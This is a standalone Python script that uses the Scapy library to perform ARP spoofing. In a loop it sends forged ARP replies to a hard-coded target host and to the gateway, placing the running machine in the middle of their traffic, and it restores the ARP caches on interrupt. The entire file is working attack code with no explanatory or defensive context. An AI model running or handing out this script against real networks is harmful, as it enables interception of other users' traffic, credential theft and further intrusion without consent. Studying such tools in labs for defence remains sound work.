from scapy.all import *
import time

def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def get_mac(ip):
    answered_list = sr1(ARP(op=1, pdst=ip), timeout=1, verbose=False)
    return answered_list.hwsrc

def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(spoof_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    target_ip = "192.168.1.10"
    gateway_ip = "192.168.1.1"
    
    try:
        while True:
            arp_spoof(target_ip, gateway_ip)
            arp_spoof(gateway_ip, target_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
